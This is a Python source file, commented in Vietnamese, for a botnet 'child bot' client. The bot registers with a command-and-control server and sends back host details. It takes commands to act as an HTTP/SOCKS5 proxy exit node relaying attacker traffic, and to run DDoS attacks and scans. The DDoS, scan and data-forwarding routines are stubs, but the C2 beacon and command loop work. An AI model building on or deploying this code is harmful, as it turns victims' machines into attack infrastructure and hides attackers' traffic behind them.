#!/usr/bin/env python3
"""
CHILD BOT SERVER
Bot server hoạt động như exit node cho proxy chain
Nhận proxy requests từ C2 server và forward đến Internet
"""

import socket
import threading
import time
import json
import hashlib
import base64
from datetime import datetime
from typing import Dict, List, Optional
import random
import ssl
import select

class ChildBotServer:
    def __init__(self, c2_host="localhost", c2_port=3333, bot_id=None):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.bot_id = bot_id or self.generate_bot_id()
        self.hostname = self.get_hostname()
        self.pid = self.get_pid()
        
        # Connection to C2 server
        self.c2_socket = None
        self.connected_to_c2 = False
        
        # Proxy mode
        self.proxy_mode = False
        self.active_connections = {}
        
        # Statistics
        self.stats = {
            'total_requests': 0,
            'total_bytes_transferred': 0,
            'active_connections': 0,
            'failed_requests': 0,
            'start_time': datetime.now(),
            'last_heartbeat': datetime.now()
        }
        
        # Health monitoring
        self.health_score = 100
        self.response_times = []
        self.last_health_check = datetime.now()
        
    def generate_bot_id(self):
        """Tạo bot ID ngẫu nhiên"""
        timestamp = str(int(time.time()))
        random_str = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
        return f"bot_{timestamp}_{random_str}"
        
    def get_hostname(self):
        """Lấy hostname của máy"""
        try:
            import platform
            return platform.node()
        except:
            return "unknown"
            
    def get_pid(self):
        """Lấy process ID"""
        try:
            import os
            return os.getpid()
        except:
            return 0
            
    def start(self):
        """Khởi động child bot server"""
        print(f"🚀 Starting Child Bot Server: {self.bot_id}")
        print(f"   🖥️  Hostname: {self.hostname}")
        print(f"   🔢 PID: {self.pid}")
        print(f"   🎯 C2 Server: {self.c2_host}:{self.c2_port}")
        
        # Kết nối đến C2 server
        if self.connect_to_c2():
            # Bắt đầu xử lý commands từ C2
            self.handle_c2_commands()
        else:
            print("❌ Failed to connect to C2 server")
            
    def connect_to_c2(self):
        """Kết nối đến C2 server"""
        try:
            self.c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.c2_socket.settimeout(10)
            self.c2_socket.connect((self.c2_host, self.c2_port))
            self.c2_socket.settimeout(None)
            
            # Gửi thông tin bot
            bot_info = f"BOT_CONNECT:{self.bot_id}:{self.hostname}:{self.pid}"
            self.c2_socket.send(bot_info.encode())
            
            self.connected_to_c2 = True
            print(f"✅ Connected to C2 server at {self.c2_host}:{self.c2_port}")
            return True
            
        except Exception as e:
            print(f"❌ Failed to connect to C2 server: {e}")
            return False
            
    def handle_c2_commands(self):
        """Xử lý commands từ C2 server"""
        while self.connected_to_c2:
            try:
                data = self.c2_socket.recv(4096).decode().strip()
                if not data:
                    break
                    
                print(f"🔍 Received command: {data}")
                
                if data == "ENABLE_PROXY_MODE":
                    self.enable_proxy_mode()
                    
                elif data == "DISABLE_PROXY_MODE":
                    self.disable_proxy_mode()
                    
                elif data == "PING":
                    self.send_pong()
                    
                elif data.startswith("PROXY_REQUEST:"):
                    self.handle_proxy_request(data)
                    
                elif data.startswith("SOCKS_REQUEST:"):
                    self.handle_socks_request(data)
                    
                elif data == "INFO":
                    self.send_info()
                    
                elif data == "HEALTH_CHECK":
                    self.send_health_report()
                    
                elif data.startswith("DDoS:"):
                    self.handle_ddos_command(data)
                    
                elif data.startswith("SCAN:"):
                    self.handle_scan_command(data)
                    
                else:
                    print(f"❓ Unknown command: {data}")
                    
            except Exception as e:
                print(f"❌ Error handling C2 command: {e}")
                break
                
        self.cleanup()
        
    def enable_proxy_mode(self):
        """Bật chế độ proxy"""
        self.proxy_mode = True
        print("🔗 Proxy mode enabled - Ready to handle proxy requests")
        self.c2_socket.send("PROXY_MODE_ENABLED\n".encode())
        
    def disable_proxy_mode(self):
        """Tắt chế độ proxy"""
        self.proxy_mode = False
        print("❌ Proxy mode disabled")
        
        # Đóng tất cả active connections
        for conn_id in list(self.active_connections.keys()):
            self.close_connection(conn_id)
            
        self.c2_socket.send("PROXY_MODE_DISABLED\n".encode())
        
    def send_pong(self):
        """Gửi PONG response"""
        self.c2_socket.send("PONG\n".encode())
        self.stats['last_heartbeat'] = datetime.now()
        
    def handle_proxy_request(self, command):
        """Xử lý HTTP proxy request"""
        try:
            parts = command.split(":")
            if len(parts) >= 5:
                connection_id = parts[1]
                target_host = parts[2]
                target_port = int(parts[3])
                is_https = parts[4].lower() == 'true'
                
                print(f"🌐 HTTP Proxy request: {target_host}:{target_port} ({'HTTPS' if is_https else 'HTTP'})")
                
                # Tạo connection đến target
                self.create_proxy_connection(connection_id, target_host, target_port, is_https, False)
                
        except Exception as e:
            print(f"❌ Error handling proxy request: {e}")
            
    def handle_socks_request(self, command):
        """Xử lý SOCKS5 proxy request"""
        try:
            parts = command.split(":")
            if len(parts) >= 4:
                connection_id = parts[1]
                target_host = parts[2]
                target_port = int(parts[3])
                
                print(f"🧦 SOCKS5 Proxy request: {target_host}:{target_port}")
                
                # Tạo connection đến target
                self.create_proxy_connection(connection_id, target_host, target_port, False, True)
                
        except Exception as e:
            print(f"❌ Error handling SOCKS request: {e}")
            
    def create_proxy_connection(self, connection_id, target_host, target_port, is_https, is_socks):
        """Tạo proxy connection đến target"""
        try:
            # Tạo socket đến target
            target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target_socket.settimeout(30)
            
            # Kết nối đến target
            target_socket.connect((target_host, target_port))
            target_socket.settimeout(None)
            
            print(f"✅ Connected to target: {target_host}:{target_port}")
            
            # Lưu connection info
            self.active_connections[connection_id] = {
                'target_socket': target_socket,
                'target_host': target_host,
                'target_port': target_port,
                'is_https': is_https,
                'is_socks': is_socks,
                'start_time': datetime.now(),
                'bytes_transferred': 0
            }
            
            # Bắt đầu proxy forwarding
            self.start_proxy_forwarding(connection_id)
            
            # Update statistics
            self.stats['total_requests'] += 1
            self.stats['active_connections'] += 1
            
        except Exception as e:
            print(f"❌ Error creating proxy connection: {e}")
            self.stats['failed_requests'] += 1
            
            # Gửi error về C2
            error_msg = f"PROXY_ERROR:{connection_id}:Connection failed: {str(e)}"
            self.c2_socket.send(error_msg.encode())
            
    def start_proxy_forwarding(self, connection_id):
        """Bắt đầu proxy forwarding"""
        def forward_data():
            try:
                connection = self.active_connections[connection_id]
                target_socket = connection['target_socket']
                
                # Đọc data từ C2 server và forward đến target
                while connection_id in self.active_connections:
                    try:
                        # Đọc data từ C2 (sẽ được gửi qua separate channel)
                        # Ở đây chúng ta sẽ implement data forwarding logic
                        time.sleep(0.1)  # Placeholder
                        
                    except Exception as e:
                        print(f"❌ Error in proxy forwarding: {e}")
                        break
                        
            except Exception as e:
                print(f"❌ Error in proxy forwarding thread: {e}")
            finally:
                self.close_connection(connection_id)
                
        # Start forwarding thread
        threading.Thread(target=forward_data, daemon=True).start()
        
    def close_connection(self, connection_id):
        """Đóng proxy connection"""
        if connection_id in self.active_connections:
            connection = self.active_connections[connection_id]
            
            try:
                connection['target_socket'].close()
            except:
                pass
                
            # Update statistics
            self.stats['active_connections'] = max(0, self.stats['active_connections'] - 1)
            self.stats['total_bytes_transferred'] += connection.get('bytes_transferred', 0)
            
            del self.active_connections[connection_id]
            print(f"🔌 Closed connection: {connection_id}")
            
    def send_info(self):
        """Gửi thông tin bot"""
        info = {
            'bot_id': self.bot_id,
            'hostname': self.hostname,
            'pid': self.pid,
            'proxy_mode': self.proxy_mode,
            'active_connections': len(self.active_connections),
            'stats': self.stats,
            'health_score': self.health_score
        }
        
        info_json = json.dumps(info, default=str)
        self.c2_socket.send(f"BOT_INFO:{info_json}\n".encode())
        
    def send_health_report(self):
        """Gửi health report"""
        # Calculate health score
        self.calculate_health_score()
        
        health_info = {
            'health_score': self.health_score,
            'active_connections': len(self.active_connections),
            'total_requests': self.stats['total_requests'],
            'failed_requests': self.stats['failed_requests'],
            'response_time': self.get_average_response_time(),
            'uptime': (datetime.now() - self.stats['start_time']).total_seconds()
        }
        
        health_json = json.dumps(health_info)
        self.c2_socket.send(f"HEALTH_REPORT:{health_json}\n".encode())
        
    def calculate_health_score(self):
        """Tính toán health score"""
        base_score = 100
        
        # Giảm điểm dựa trên failed requests
        if self.stats['total_requests'] > 0:
            failure_rate = self.stats['failed_requests'] / self.stats['total_requests']
            base_score -= int(failure_rate * 50)
            
        # Giảm điểm dựa trên số connections
        if len(self.active_connections) > 50:
            base_score -= 20
        elif len(self.active_connections) > 100:
            base_score -= 40
            
        # Giảm điểm dựa trên response time
        avg_response_time = self.get_average_response_time()
        if avg_response_time > 5.0:
            base_score -= 30
        elif avg_response_time > 2.0:
            base_score -= 15
            
        self.health_score = max(0, min(100, base_score))
        
    def get_average_response_time(self):
        """Lấy response time trung bình"""
        if not self.response_times:
            return 0.0
        return sum(self.response_times) / len(self.response_times)
        
    def handle_ddos_command(self, command):
        """Xử lý DDoS command"""
        try:
            parts = command.split(":")
            if len(parts) >= 4:
                attack_type = parts[1]
                target = parts[2]
                duration = int(parts[3])
                
                print(f"💥 DDoS attack: {attack_type} -> {target} for {duration}s")
                
                # Implement DDoS logic here
                # This is just a placeholder
                
        except Exception as e:
            print(f"❌ Error handling DDoS command: {e}")
            
    def handle_scan_command(self, command):
        """Xử lý scan command"""
        try:
            parts = command.split(":")
            if len(parts) >= 3:
                scan_type = parts[1]
                target = parts[2]
                
                print(f"🔍 Scan: {scan_type} -> {target}")
                
                # Implement scan logic here
                # This is just a placeholder
                
        except Exception as e:
            print(f"❌ Error handling scan command: {e}")
            
    def cleanup(self):
        """Cleanup resources"""
        print("🧹 Cleaning up...")
        
        # Đóng tất cả connections
        for conn_id in list(self.active_connections.keys()):
            self.close_connection(conn_id)
            
        # Đóng C2 connection
        if self.c2_socket:
            try:
                self.c2_socket.close()
            except:
                pass
                
        self.connected_to_c2 = False
        print("✅ Cleanup completed")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Child Bot Server")
    parser.add_argument("--c2-host", default="localhost", help="C2 server host")
    parser.add_argument("--c2-port", type=int, default=3333, help="C2 server port")
    parser.add_argument("--bot-id", help="Custom bot ID")
    
    args = parser.parse_args()
    
    # Create and start bot server
    bot_server = ChildBotServer(args.c2_host, args.c2_port, args.bot_id)
    
    try:
        bot_server.start()
    except KeyboardInterrupt:
        print("\n🛑 Shutdown requested")
        bot_server.cleanup()

if __name__ == "__main__":
    main()
